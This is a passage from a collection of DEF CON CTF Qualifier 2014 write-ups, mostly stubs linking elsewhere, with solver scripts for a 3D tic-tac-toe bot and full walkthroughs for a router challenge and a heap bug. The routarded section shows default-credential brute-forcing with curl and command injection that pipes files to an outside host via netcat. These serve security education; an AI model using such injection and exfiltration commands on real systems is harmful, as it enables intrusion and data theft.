1476c96c36beb2d870e36580eeeafb73cb676d1f2ec0162d8cfef2fdfcf963f4af63d423c8fa813c5304ec324e6d604de9924a36f852ba34fe562fb9438a17eec1bc4fbc2e20da23a6bb18932e0b1a464895b36b45a368915968dd86ec036c599dca7206c1fe764fbe649c2abe67a8b9e2517c80a9271b6cae299c726bd509c271a4f3e2aecf6992db7ba16bb184f57558de8e9ca2f147fe823d73b4887986d69175b2dbe7962f66c206b31e46de8582bde6bf03e2392ebe22d91991189c999d66724fa3e8353dfc710cc6120168bdead1fd4efd3737abd43bf4e3fa93fa1bfae5fd4abdc48bba567f130be0ec86913519079323bd7db63b7b7cfab16bbdb25b56fa3440e49f93df4e9e9da20290f49d0b76163ff1c21c7070e1c3b064dd9ed92b3a75ff2670fb44b41043c149841c0903d6782a68170241cd9257fe82671200c767b2482ad8cc83d78c39d0fe28422c41e8e44c2710a4a2016b1ef929ff670581624b234a001541dc68a8a02117b18cffbb441096a10250996339441def06058b62cdbc0764b58364b1000648884638e843306b700fc175c495b490a656e6473747265616d0a656e646f626a0a0a362030206f626a0a353939340a656e646f626a0a0a372030206f626a0a3c3c2f547970652f466f6e7444657363726970746f722f466f6e744e616d652f4241414141412b4c696265726174696f6e4d6f6e6f0a2f466c61677320350a2f466f6e7442426f785b2d3234202d33303020363037203833325d2f4974616c6963416e676c6520300a2f417363656e74203833320a2f44657363656e74202d3330300a2f436170486569676874203833320a2f5374656d562038300a2f466f6e7446696c65322035203020520a3e3e0a656e646f626a0a0a382030206f626a0a3c3c2f4c656e677468203237332f46696c7465722f466c6174654465636f64653e3e0a73747265616d0a789c5d91cf4ec42010c6ef3c05c7f5b0a1addb5d4d9a266b75931efc13bb3e00856925b140283df4ed85a16ae201f21be6fb2633036bdac7562bcfde9c111d783a282d1dcc667102680fa3d2242fa854c26f11de62e296b0e0edd6d9c3d4eac1541561ef21377bb7d2dd599a1e6e087b75129cd223dd7d345d88bbc5da2f98407b9a91baa6128650e799db173e0143d7be9521adfcba0f963fc175b5400b8cf3d48a301266cb0538ae47205596d5b4ba5c6a025afecbe59ba51fc42777419a07699695a73a70817c2c23df221759e4437a7f8a5c263e443e26ce239f904f58e72e317aef93a6897c4e8c9a87a429b1c9ad9bd86edce7cf1aa8589c0b2bc0a5e3ec716aa5e1f75facb1d185e71b3a3884eb0a656e6473747265616d0a656e646f626a0a0a392030206f626a0a3c3c2f547970652f466f6e742f537562747970652f54727565547970652f42617365466f6e742f4241414141412b4c696265726174696f6e4d6f6e6f0a2f46697273744368617220300a2f4c617374436861722031310a2f5769647468735b3630302036303020363030203630302036303020363030203630302036303020363030203630302036303020363030205d0a2f466f6e7444657363726970746f722037203020520a2f546f556e69636f64652038203020520a3e3e0a656e646f626a0a0a31302030206f626a0a3c3c2f46312039203020520a3e3e0a656e646f626a0a0a31312030206f626a0a3c3c2f466f6e74203130203020520a2f50726f635365745b2f5044462f546578745d0a3e3e0a656e646f626a0a0a312030206f626a0a3c3c2f547970652f506167652f506172656e742034203020522f5265736f7572636573203131203020522f4d65646961426f785b30203020363132203739325d2f47726f75703c3c2f532f5472616e73706172656e63792f43532f4465766963655247422f4920747275653e3e2f436f6e74656e74732032203020523e3e0a656e646f626a0a0a342030206f626a0a3c3c2f547970652f50616765730a2f5265736f7572636573203131203020520a2f4d65646961426f785b203020302036313220373932205d0a2f4b6964735b203120302052205d0a2f436f756e7420313e3e0a656e646f626a0a0a31322030206f626a0a3c3c2f547970652f436174616c6f672f50616765732034203020520a2f4f70656e416374696f6e5b3120302052202f58595a206e756c6c206e756c6c20305d0a2f4c616e6728656e2d5553290a3e3e0a656e646f626a0a0a31332030206f626a0a3c3c2f43726561746f723c464546463030353730303732303036393030373430303635303037323e0a2f50726f64756365723c464546463030344330303639303036323030373230303635303034463030363630303636303036393030363330303635303032303030333430303245303033323e0a2f4372656174696f6e4461746528443a32303134313031393134313532325a27293e3e0a656e646f626a0a0a787265660a302031340a303030303030303030302036353533352066200a30303030303037313338203030303030206e200a30303030303030303139203030303030206e200a30303030303030313935203030303030206e200a30303030303037323831203030303030206e200a30303030303030323135203030303030206e200a30303030303036323933203030303030206e200a30303030303036333134203030303030206e200a30303030303036353036203030303030206e200a30303030303036383438203030303030206e200a30303030303037303531203030303030206e200a30303030303037303833203030303030206e200a30303030303037333830203030303030206e200a30303030303037343737203030303030206e200a747261696c65720a3c3c2f53697a652031342f526f6f74203132203020520a2f496e666f203133203020520a2f4944205b203c36383932393934393437383944363833443145384339353431423436353046413e0a3c36383932393934393437383944363833443145384339353431423436353046413e205d0a2f446f63436865636b73756d202f37303137383031394639464137433239314544353538314243363544344545330a3e3e0a7374617274787265660a373634370a2525454f460a
```

After copying that to our pasteboard, we can undo the hex encoding as follows:

```bash
$ pbpaste | xxd -r -p > flag.pdf
```

Opening the resulting `flag.pdf` file reveals the flag:

```
We need a new plague
```

## Other write-ups and resources

* <http://dragosgaftoneanu.com/d-ctf-2014-prequals-writeups/>
# DEF CON CTF Qualifier 2014: 100lines

**Category:** Jymbolia
**Points:** 2
**Description:**

> It's not broken, you just need more RAM.
> [http://services.2014.shallweplayaga.me/100lines_53ac15fc7aa93da92629d37a669e106c](100lines_53ac15fc7aa93da92629d37a669e106c)
> `100lines_53ac15fc7aa93da92629d37a669e106c.2014.shallweplayaga.me:20689 `

## Write-up

(TODO)

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/05/def-con-quals-2014-100lines-writeup.html>
* [Japanese](http://epsilondelta.hatenablog.jp/entry/2014/05/20/014011)
# DEF CON CTF Qualifier 2014: 3dttt

**Category:** Baby’s First
**Points:** 1
**Description:**

> Play well and play fast.
> `3dttt_87277cd86e7cc53d2671888c417f62aa.2014.shallweplayaga.me:1234`

## Write-up

In this challenge you had to beat LegitBS’s bot in a game of 3D Tic-Tac-Toe. You had to get to a balance of +50 games.

Here is an example solution:

```python
import socket
import sys

def generate_combos():
  combos = []
  #all horizontal lines
  for grid in range(3):
    for row in range(3):
      combos.append([(0,row,grid), (1,row,grid), (2,row,grid)])

  for grid in range(3):
    for row in range(3):
      combos.append([(row,0,grid), (row,1,grid), (row,2,grid)])

  #all vertical lines
  for row in range(3):
    for col in range(3):
      combos.append([(row,col,0),(row,col,1),(row,col,2)])

  #les diagonnals in a same grid
  for grid in range(3):
    combos.append([(0,0,grid), (1,1,grid), (2,2,grid)])
    combos.append([(0,2,grid), (1,1,grid), (2,0,grid)])

  #diagonnals on the same plan
  for row in range(3):
    combos.append([(row,0,0), (row,1,1), (row,2,2)])
    combos.append([(0,row,0), (1,row,1), (2,row,2)])
    combos.append([(row,2,0), (row,1,1), (row,0,2)])
    combos.append([(0,row,2), (1,row,1), (2,row,0)])

  #diagonnal diagonnals?!
  combos.append([(0,0,0), (1,1,1), (2,2,2)])
  combos.append([(2,0,0), (1,1,1), (0,2,2)])
  combos.append([(0,2,0), (1,1,1), (2,0,2)])
  combos.append([(2,2,0), (1,1,1), (0,0,2)])

  return combos

def parse_board(data):

  my_moves = []
  his_moves = []
  all_moves = []

  lines = [line.strip() for line in data.split('\n') if line.find('|') != -1]
  clean_lines = [line.replace('0','') for line in lines]
  clean_lines = [line.replace('1','') for line in clean_lines]
  clean_lines = [line.replace('2','') for line in clean_lines]

  for idx, line in enumerate(clean_lines):
    if idx < 3:
      grid = 0
      row = idx
    elif idx < 6:
      grid = 1
      row = idx - 3
    else:
      grid = 2
      row = idx - 6
    cases = [case.strip() for case in line.split('|')]
    for idx, case in enumerate(cases):
      if case.find('X') != -1:
        my_moves.append((idx,row,grid))
        all_moves.append((idx,row,grid))
      elif case.find('O') != -1:
        his_moves.append((idx,row,grid))
        all_moves.append((idx,row,grid))
  return my_moves, his_moves, all_moves


def update_valid(combos, his_moves):
  for move in his_moves:
    for combo in combos:
      if move in combo:
        combos.remove(combo)

  return combos

def update_d_valid(combos, his_moves):
  for move in his_moves:
    for combo in combos:
      if move in combo:
        combos.remove(combo)

  return combos

def get_try(combos, my_moves, all_moves):

  best_count = 0
  best_combo = combos[0]
  for combo in combos:
    count = 0
    for move in my_moves:
      if move in combo:
        count +=1
    if count > best_count:
      best_count = count
      best_combo = combo

  for move in best_combo:
    if move not in all_moves:
      return move

  return None

def defensive_move(d_combos, his_moves, all_moves):

  danger_combo = []
  for combo in d_combos:
    count = 0
    for move in his_moves:
      if move in combo:
        count +=1
    if count == 2:
      danger_combo = combo

  for move in danger_combo:
    if move not in all_moves:
      return move

  return None

def get_try_apocalypse(used):

  for a in xrange(3):
    for b in xrange(3):
      for c in xrange(3):
        if (a,b,c) not in used:
          return (a,b,c)
  return None

HOST = '3dttt_87277cd86e7cc53d2671888c417f62aa.2014.shallweplayaga.me'
PORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

my_moves = []
his_moves = []
all_moves = []
combos = generate_combos()
d_combos = generate_combos()

new_round = True

while True:
  try:

    data = s.recv(1024)
    if "flag" in data:
      print data
      break

    if new_round or data.find("Let's play again") != -1:
      my_moves = []
      his_moves = []
      all_moves = []
      combos = generate_combos()
      d_combos = generate_combos()

      s.send("1,1,1\n")
      s.recv(1024)
      my_moves, his_moves, all_moves = parse_board(data)
      # Best starter moves according to first google result!
      # Trustworthy source for sure
      if (1,1,0) in his_moves:
        s.send("1,1,2\n")
      else:
        s.send("1,1,0\n")
      new_round = False
      continue

    my_moves, his_moves, all_moves = parse_board(data)
    combos = update_valid(combos, his_moves)
    d_combos = update_d_valid(d_combos, my_moves)
    a_try = defensive_move(d_combos, his_moves, all_moves)

    # If no defensive moves are needed go offense
    if a_try is None:
      a_try = get_try(combos, my_moves, all_moves)

    # If can't find a good offensive move...
    # close your eyes and point somewhere >_<
    if a_try is None:
      a_try = get_try_apocalypse(all_moves)

    # (1, 1, 1) ---> 1,1,1
    s.send(str(a_try).replace('(','').replace(')','').replace(' ','')+'\n')

  except Exception as e:
    print e
    print "exception im very out"
    break
```

## Alternate solution
The following solution simply plays the most valuable move repeatedly and very quickly wiped the floor with the challenge bot ;-) The value of any given move is based purely on the number of potential lines the move lies on, see the findMove function below.

```python
import random
import socket

#Position weights (# of lines each position lies on)
weights = [
           #Front layer
           7, 4, 7,
           4, 3, 4,
           7, 4, 7,

           #Middle layer
           4, 3, 4,
           3, 8, 3,
           4, 3, 4,

           #Back layer
           7, 4, 7,
           4, 3, 4,
           7, 4, 7,
          ]

#Current board state (1 if taken, 0 if not)
state = [
         0, 0, 0,
         0, 0, 0,
         0, 0, 0,

         0, 0, 0,
         0, 0, 0,
         0, 0, 0,

         0, 0, 0,
         0, 0, 0,
         0, 0, 0
        ]

#Convert x,y,z co-ordinates to index
def indexFromCoords(zIn, yIn, xIn):
    return (int(zIn) * 9) + (int(yIn) * 3) + int(xIn)

#Convert index back to x,y,z co-ordinates string to submit as a move
def indexToCoords(iIn):
    zCoord = (iIn - (iIn % 9)) / 9
    i2d = (iIn - (zCoord * 9))
    yCoord = (i2d - (i2d % 3)) / 3
    xCoord = (i2d - (yCoord * 3))
    return str(xCoord) + "," + str(yCoord) + "," + str(zCoord) + "\n"

#Parse board state from service output
def parseBoard(output):
    global state

    #Parse output
    curZ = 0
    curY = -1
    for line in output.splitlines():
        curY = -1
        if "Let's play again" in line:
            #Reset state
            state = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        if line.startswith(" x 0   1   2    z="):
            #Update current Z
            curZ = line[18:19]
        elif line.startswith("0"):
            curY = 0
        elif line.startswith("1"):
            curY = 1
        elif line.startswith("2"):
            curY = 2

        #If curY > -1 then parse out board state
        if curY > -1:
            #3:4, 7:8, 11:12 are positions of TTT pieces
            if line[3:4] == "X" or line[3:4] == "O":
                #X = 0 = not empty
                state[indexFromCoords(curZ, curY, 0)] = 1
            if line[7:8] == "X" or line[7:8] == "O":
                #X = 1 = not empty
                state[indexFromCoords(curZ, curY, 1)] = 1
            if line[11:12] == "X" or line[11:12] == "O":
                #X = 2 = not empty
                state[indexFromCoords(curZ, curY, 2)] = 1

#This is the solution, simples!
#Find the highest available move weight then pick a random move from all those with the same weight.
def findMove():
    #Find highest possible weight
    maxWeight = 0
    for i in range(0, 27):
        if state[i] == 0 and weights[i] > maxWeight:
            maxWeight = weights[i]

    #Find all available moves of at least maxWeight
    potentialMoves = []
    for i in range(0, 27):
        if state[i] == 0 and weights[i] == maxWeight:
            potentialMoves.append(i)

    #Select random move from potential moves
    return random.choice(potentialMoves)

#Deets
target_host = "3dttt_87277cd86e7cc53d2671888c417f62aa.2014.shallweplayaga.me"
target_port = 1234
done = False

#Let's play a game...
#Connect, receive and print first chunk
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_host, target_port))
print sock.recv(4096)

#Play first move - always 1,1,1
sock.send("1,1,1\n")
print "1,1,1"

#Play most valuable move repeatedly
while done == False:
    try:
        #Receive a chunk of data
        data = sock.recv(4096)
        if not data:
            done = True
        else:
            print data

            #Parse the game state
            parseBoard(data)

            #Select a move
            move = findMove()

            #Play the move
            sock.send(indexToCoords(move))
            print indexToCoords(move)

    except socket.error:
        done = True

print "...Done?"
```

## Other write-ups and resources

* <https://vanned.info/3dttt.html>
* [Matir's write up](https://systemoverlord.com/blog/2014/05/21/def-con-22-ctf-quals-3dttt/)
# DEF CON CTF Qualifier 2014: bbgp

**Category:** Selir
**Points:** 2
**Description:**

> Pwn my router
> `bbgp_7cdbfdae936b3c6ed10588119a8279a0.2014.shallweplayaga.me:179`
> [http://services.2014.shallweplayaga.me/bbgp_7cdbfdae936b3c6ed10588119a8279a0](bbgp_7cdbfdae936b3c6ed10588119a8279a0)

## Write-up

(TODO)

## Other write-ups and resources

* <https://privatepaste.com/6afd54f16c>
# DEF CON CTF Qualifier 2014: blackbox

**Category:** Sirgoon
**Points:** 2
**Description:**

> Crack open the box at `blackbox_655bccf42ebf1d821ebf25e8464ea2e3.2014.shallweplayaga.me:10456`

## Write-up

(TODO)

## Other write-ups and resources

* (none yet)
# DEF CON CTF Qualifier 2014: byhd

**Category:** HJ
**Points:** 2
**Description:**

> Who hath lived like hacker's life and refused the normalness must be rewarded with straw, sticks and bricks.
> [http://services.2014.shallweplayaga.me/byhd_147e0accdae13428910e909704b21b11](byhd_147e0accdae13428910e909704b21b11)
> `byhd_147e0accdae13428910e909704b21b11.2014.shallweplayaga.me:9730`

## Write-up

(TODO)

## Other write-ups and resources

* <http://zepvn.com/blog/defcon-ctf-quals-2014-byhd.php>
* [SkullSecurity](https://blog.skullsecurity.org/2014/defcon-quals-writeup-for-byhd-reversing-a-huffman-tree)
* <http://pastebin.com/cibCHcse>
# DEF CON CTF Qualifier 2014: choripan

**Category:** Vito Genovese
**Points:** 4
**Description:**

> `choripan_ff53019a701f0124987ed3bf169a1635.2014.shallweplayaga.me 6910`

## Write-up

(TODO)

## Other write-ups and resources

* [Challenge source code (released after the CTF)](https://github.com/legitbs/choripan)
# DEF CON CTF Qualifier 2014: dosfun4u

**Category:** Lightning
**Points:** 5
**Description:**

> Welcome to DOS, this is going to suck
> [http://services.2014.shallweplayaga.me/dosfun4u_5d712652e1d06a362f7fc6d12d66755b](dosfun4u_5d712652e1d06a362f7fc6d12d66755b)
> `dosfun4u_5d712652e1d06a362f7fc6d12d66755b.2014.shallweplayaga.me:8888`
>
> Hint: http://www.engadget.com/2014/05/17/game-of-thrones-author-explains-old-pc/ #dosfun4u #defcon #ctf #hint #yolo

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/nopple/ctf/tree/master/dosfun4u>
* <http://www.synacktiv.com/ressources/defcon-ctf-2014-quals-dosfun4u-writeup.pdf>
# DEF CON CTF Qualifier 2014: dosfun4u round 2

**Category:** Lightning
**Points:** 5
**Description:**

> Download dosfun4u and read the key off the harddrive
> [http://services.2014.shallweplayaga.me/dosfun4u_5d712652e1d06a362f7fc6d12d66755b](dosfun4u_5d712652e1d06a362f7fc6d12d66755b)
> `dosfun4u_5d712652e1d06a362f7fc6d12d66755b.2014.shallweplayaga.me:8888`

## Write-up

(TODO)

## Other write-ups and resources

* http://www.synacktiv.com/ressources/defcon-ctf-2014-quals-dosfun4u-writeup.pdf
# DEF CON CTF Qualifier 2014: fritas

**Category:** Vito Genovese
**Points:** 2
**Description:**

> `fritas_91a318f87f384a080595696b3c73fc39.2014.shallweplayaga.me 6908`
>
> Hint: code, length = header.unpack 'CN' #fritas #hint #defcon #ctf

## Write-up

(TODO)

## Other write-ups and resources

* [Solution in Python by IdolfHatler](https://gist.github.com/Idolf/d952bf797a4d71cddbba)
# DEF CON CTF Qualifier 2014: hackertool

**Category:** Baby’s First
**Points:** 1
**Description:**

> hey, we need to check that your connection works, torrent this file and md5 it
>
> http://services.2014.shallweplayaga.me/hackertool.torrent\_fe3b8b75e9639d35e8ac1d9809726ee2
>
> KINDA A HINT FOR HACKERTOOL: http://imgur.com/XCtMjJ2

## Write-up

The challenge provided us with a .torrent file and told us to download it and use the md5 checksum of the file inside as flag. I first tried to straight up download the file but it was almost a 60gb download and it seemed to be throttled (which later got confirmed by the hint).

The torrent specification describes an optional field for md5 checksums of the files it contains (https://wiki.theory.org/BitTorrentSpecification) so I tried to read it, but alas, it was empty.

Then it hit me, the file was named `every_ip_address.txt` so it was probally a text file lisiting the entire IPV4 address range. So I wrote up a simple python script that iterates each address:
```python
for a in range(0,256):
	for b in range(0,256):
		for c in range(0,256):
			for d in range(0,256):
				string = "%s.%s.%s.%s" % (a,b,c,d)
				print string
```

Running it and piping the output to `md5sum` gave us the flag:
```
root@kali:~# python ip.py | md5sum
1a97f624cc74e4944350c04f5ae1fe8d
```

## Other write-ups and resources

* [Matir’s writeup](https://systemoverlord.com/blog/2014/05/19/def-con-22-ctf-quals-hackertool/)
* <https://hackucf.org/blog/hackertool/>
* <http://delogrand.blogspot.de/2014/05/defcon-2014-quals-hackertool.html>
# DEF CON CTF Qualifier 2014: heap

**Category:** Baby’s First
**Points:** 1
**Description:**

> Heap feng shui not required: [http://services.2014.shallweplayaga.me/babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c](babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c) : `babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c.2014.shallweplayaga.me:4088`

## Write-up

(TODO)

## Other write-ups and resources

* <https://isisblogs.poly.edu/2014/05/19/babys-first-heap-exploit-defcon-quals-2014/>
* <http://pastebin.com/iM6wCRqa>
* <http://v0ids3curity.blogspot.in/2014/05/defcon-quals-2014-babys-first-heap-team.html>
* <http://tasteless.eu/2014/05/def-con-ctf-qualifier-2014-babys-heap/>
* [Japanese](http://epsilondelta.hatenablog.jp/entry/2014/05/20/014011)
* <http://pastebin.com/wqDPJhvv>
# DEF CON CTF Qualifier 2014: medianoche

**Category:** Vito Genovese
**Points:** 3
**Description:**

> `medianoche_8b447fc7f99c257ee475381093eb6b25.2014.shallweplayaga.me 6909`

## Write-up

(TODO)

## Other write-ups and resources

* [Solution in Python by IdolfHatler](https://gist.github.com/IdolfHatler/d952bf797a4d71cddbba)
# DEF CON CTF Qualifier 2014: nonameyet

**Category:** HJ
**Points:** 3
**Description:**

> I claim no responsibility for the things posted here. `nonameyet_27d88d682935932a8b3618ad3c2772ac.2014.shallweplayaga.me:80`

## Write-up

(TODO)

## Other write-ups and resources

* (none yet)
# DEF CON CTF Qualifier 2014: polyglot

**Category:** Gynophage
**Points:** 4
**Description:**

> Just open `/flag`, and write it to stdout. How hard could it be?
>
> `polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me 30000`
>
> Password: `w0rk_tHaT_tAlEnTeD_t0nGu3`

## Write-up

(TODO)

## Other write-ups and resources

* <http://sigint.ru/writeups/2014/05/18/defcon-2014-quals--polyglot/>
* <https://gist.github.com/IdolfHatler/d952bf797a4d71cddbba>
* [Japanese](http://epsilondelta.hatenablog.jp/entry/2014/05/20/014011)
* <http://vnsecurity.net/ctf%20-%20clgt%20crew/uncategorized/2014/05/22/defcon-2014-polyglot.html>
* <http://pastebin.com/9cRWa1EC>
# DEF CON CTF Qualifier 2014

* [Main website](https://2014.legitbs.net/)
* [Explanation of category names](https://2014.legitbs.net/scoreboard/categories)
* [Scoreboard](https://2014.legitbs.net/scoreboard) or [local alternative](scoreboard.txt)
* [Scoreboard data dump](https://blog.legitbs.net/2014/05/quals-2014.html)
* [@legitbs_ctf on Twitter](https://twitter.com/legitbs_ctf)
* [DEF CON CTF Qualifier 2014 @ CTFtime.org](https://ctftime.org/event/129)
* [Source code for challenges on GitHub (to be added after DEF CON Finals 2014)](https://github.com/legitbs/quals-2014)

## Completed write-ups

* [3dttt](3dttt)
* [hackertool](hackertool)
* [routarded](routarded)
* [shitsco](shitsco)
* [zombies](zombies)

## External write-ups only

* [100lines](100lines)
* [bbgp](bbgp)
* [byhd](byhd)
* [choripan](choripan)
* [dosfun4u](dosfun4u)
* [dosfun4u round 2](dosfun4u-round-2)
* [fritas](fritas)
* [heap](heap)
* [medianoche](medianoche)
* [polyglot](polyglot)
* [rebaby](rebaby)
* [sftp](sftp)
* [turdedo](turdedo)

## Missing write-ups

* [blackbox](blackbox)
* [nonameyet](nonameyet)
* [sick](sick)
# DEF CON CTF Qualifier 2014: rebaby

**Category:** Jymbolia
**Points:** 3
**Description:**

> Just run it and you get the flag. Might be a bit slow.

## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/h7XBncLq>
# DEF CON CTF Qualifier 2014: routarded

**Category:** Baby’s First
**Points:** 1
**Description:**

> Wow, they forwarded http on a router with default creds?
>
> http://routarded_87f7837f50a5370771b9467d840c93c5.2014.shallweplayaga.me:5000/

## Write-up

The hint mentioned default credentials, so we tried some default credentials. After some trying, we found out leaving the username field empty and entering `admin` for the password successfully logged us in.

In the router’s web interface, there was a page to ping IP addresses and domain names (amongst other things). When we attempted to add another command to that, the command was sanitized. For example, entering `8.8.8.8; ls` got sanitized into `8.8.8.8`. However, we saw the sanitizing happening in the browser. Seems like a case of JavaScript-only protection!

We disabled JavaScript in our browser and tried entering `; ls`. This effectively bypassed the filter (i.e. they didn’t do any sanitizing on the back-end), and we got the directory listing this time:

```
bower_components
flag
requirements.txt
routarded.py
static
templates
```

The `flag` file seemed like the right thing. Let’s enter `; cat flag`:

```
The flag is: l0l, can't believe they still do this shit
```

## Write-up 2 (by @d1rt_diggler)

**Note: this is from memory, so some details might be slightly off.**

### Casing the joint

Connecting to the server via browser greated you with a standard HTTP auth prompt. There was no splash page, and I don’t recall anything fancy in the headers, so no hints there…

###Defaults, okay, but WHICH defaults?
I started with your basics by hand (you never know!) admin:admin, admin:password, admin:blank, administrator:administrator, etc.
all without success, I didn't have a password list for router defaults on hand but about 2 minutes of Goog-fu turned some up.  I found http://defaultpassword.com and liked the format and variety, so I just did a full copy and paste of the home page (which lists all the passwords by default, awesome!) and dropped it into a text file.

The defaults were kind of weird though and since it seems to be crowd sourced the standarization for (blank), (none), n/a, etc. was... well, not standard.  I ended up passing the list through a couple grep and awk 1 liners to get only HTTP auth versions and to clean it up the non-standard types for "blank".
```
$ cat passwords.txt | awk '{print $6" "$7}' > first_pass.txt
$ cat first_pass.txt | awk {gsub('\\(none\\)','',$1); gsub('\\(none\\)','',$2);print $1" "$2}' > second_pass.txt
$ cat second_pass.txt | awk {gsub('n\\a','',$1); gsub('n\\a','',$2);print $1" "$2}' > third_pass.txt
$ cat third_pass.txt | awk {gsub('\\(blank\\)','',$1); gsub('\\(blank\\)','',$2);print $1" "$2}' > last_pass.txt
```
Those turned this...
```
3com    cellplex        7000    Telnet  admin   admin   Admin   No
3COM    CellPlex        7000    Telnet  tech    tech    Admin   No
3COM    CellPlex                HTTP    admin   synnet  Admin   No
3COM    CoreBuilder     7000/6000/3500/2500     Telnet  debug   synnet          No
3COM    CoreBuilder     7000/6000/3500/2500     Telnet  tech    tech            No
3COM    HiPerARC        v4.1.x  Telnet  adm     (none)  Admin   No
```
Into this... (roughly... it wasn't perfect, but I was aiming for "good enough")
```
admin admin
tech tech
admin synnet
debug synnet
tech tech
adm
```
Now we had a condensed list, but there were some dupes, no use in retrying pairs.
```
$ cat last_pass.txt | sort | uniq > uniq_pass.txt
```
This would turn
```
admin admin
admin admin
admin password
admin admin
admin administrator
admin admin
admin administrator
admin password
```
Into
```
admin admin
admin administrator
admin password
```
Which would reduce the amount of time it needed to test since we wouldn't be pointlessly testing the same creds over and over.

Now I wanted to format these into the HTTP user:pass format for curl
```
$ cat uniq_pass.txt | awk '{print $1":"$2}' > http_auths.txt
```
Which turned the list generated earlier into
```
admin:admin
tech:tech
admin:synnet
debug:synnet
tech:tech
adm:
```
###We've got our creds, now we need to test em'
Open up good ole vim and pumped out a shell script that would loop over the creds file and attempt
a curl to the router using a set of credentials... if it failed, it would be a 1 line error, if it
worked I'd see a flood of HTML content.

```bash
#!/usr/bin/env bash
users=$(cat http_auths.txt);
for user in $users; do
  echo $user;
  echo "";
  curl -u "$user" "http://routarded_87f7837f50a5370771b9467d840c93c5.2014.shallweplayaga.me:5000/";
  echo "-----"
done;
```

Run it and scan the results for a successful auth.

```bash
$ ./test_auths | less
```

### `[BLANK]:admin`

Of course, the one default I didn’t think to try by hand… OF COURSE!

### Now we're in, let's look around
There really wasn't much to see, under the "tools" or "settings" tab (I can't remember which) there were
two tools that caught my eye, one was a traceroute, the other ping.  Running either returned nothing. I
actually thought something was misconfigured (like legitmately, not in the "break this piece" sense) and
looked around for a few more minutes before deciding to see if I could abuse the ping tool. I was going
in blind though since I couldn't tell if these tools were even getting to a system behind the scenes...
how could I do a simple blind test to see...

```
ping [ google.com ]
(page hangs for roughly 3 seconds, loads)
ping [ 127.asdf.asdf.174188 ]
(page loads immediately)
```

Hmmm okay, so it does seem like it's actually running a ping in the background, maybe it's injectable? I can't
really tell from the busted ass web UI tho... maybe I can get it to phone home.  I jump on my public facing VPS
and type in:

```
$ nc -vvv -lp 4545
Listening on any address 4545 (worldscores)
```

Time to find out...

```
ping [ 127.0.0.1; nc myvps.domains.lol 4545; ]
```

YEAH BUDDY!

```
Connection from 133.7.101.256:49245
```

### Scope the joint

Well we confirmed we had an injectable script, and we confirmed we could phone home, now we just need to
get our hands on that flag... but where the hell is it and where the hell am I?!

```
ping [ 127.0.0.1; ls -lahR /home/ | nc myvps.domains.lol 4545; ]
```

On my listening machine...

```
..snip..
/home/routarded/ (or / I don't remember...)
-rw-r--r--  1 routarded routarded  21   May 14 19:56 flag
..snip..
```

### Gettin’ the goods

Well, we've found it, so we’re pretty much done, all I need to do now is read the file and we’re golden.
```
ping [ 127.0.0.1; cat /home/routarded/flag | nc myvps.domains.lol 4545; ]
```

And on my listening machine...

```
$ nc -vvv -lp 4545
Listening on any address 4545 (worldscores)
Connection from 133.7.101.256:49245
The flag is: l0l, can't believe they still do this shit
```

## Other write-ups and resources

* <http://www.incertia.net/blog/defcon-ctf-qualifiers-2014-routarded/>
* <https://hackucf.org/blog/routarded/>
# DEF CON CTF Qualifier 2014: sftp

**Category:** Gynophage
**Points:** 3
**Description:**

> Such a simple daemon.
>
> [http://services.2014.shallweplayaga.me/sftp_bf28442aa4ab1a4089ddca16729b29ac](sftp_bf28442aa4ab1a4089ddca16729b29ac)
>
> `sftp_bf28442aa4ab1a4089ddca16729b29ac.2014.shallweplayaga.me:115`

## Write-up

(TODO)

## Other write-ups and resources

* <http://thejh.net/written-stuff/defcon-quals-2014-sftp-writeup>
* <http://idabook.com/ctf/sftp_walkthrough.txt>
* [Japanese](http://epsilondelta.hatenablog.jp/entry/2014/05/20/014011)
# DEF CON CTF Qualifier 2014: shitsco

**Category:** Gynophage
**Points:** 2
**Description:**

> [http://services.2014.shallweplayaga.me/shitsco_c8b1aa31679e945ee64bde1bdb19d035](shitsco_c8b1aa31679e945ee64bde1bdb19d035) is running at:
>
> `shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me:31337`
>
> Capture the flag.

## Write-up

Shitsco is a small router emulator. It allows you to ping, to tracert, to use the shell (Yhea, right! :D) and to set and view variables.

As we smell a rat in the variable handling we look into it.

Variables get stored dynamically in a double linked list as shown next.

```c
struct node {
    char *name;
    char *value;
    struct node *next;
    struct node *prev;
};
```

If you create a couple of nodes and delete the first, its strings get freed, their pointers set to NULL but not the link to the next node. Further, commands like show will always start the traversal by the first node, which will succeed until the corresponding memory gets overwritten. Thats what we gonna exploit.

The key is to set variable name and value the same size as a node internally has -> 4 * 4bytes = 16bytes.
So that when adding nodes, the strings and the node itself consume the same amount of memory.


The following is the memory layout with 3 nodes added(= 3 variables set). Note that there is no first node. The first node is in static memory. Also, every allocated heap block has the same length(size).

```
--------------------------------------------------------------
                   /----link----\
HEAP: [ S ][ S ][ N ][ S ][ S ][ N ][ S ][ S ]    N = Node
                 ^                                S = String
                 |
first.next ------/
--------------------------------------------------------------
```

Because of a bug in the system, the first node never gets unlinked properly.
When we delete it, only the strings get freed and set to NULL. The *next pointer stays the same.

```
--------------------------------------------------------------
                   /----link----\
HEAP: [   ][   ][ N ][ S ][ S ][ N ][ S ][ S ]
first.next ------/
--------------------------------------------------------------
```

Deleting also the second results as depicted next.

```
--------------------------------------------------------------
                   /----link----\
HEAP: [   ][   ][   ][   ][   ][ N ][ S ][ S ]
first.next ------/
--------------------------------------------------------------
```

The linked list is still intact because the *next pointers never gets set to NULL when deleting the fist node in the list.

When we now create a new node, the system will use the first static node again and just looks to allocate memory for the name and value. As we created uni-sized blocks, the malloc algorithm would use simply the first two free blocks again. Better would have been, if we had set the first block to a smaller size, let's say 11bytes, so the allocations would be like below.


```
--------------------------------------------------------------
 small\          /----link----\
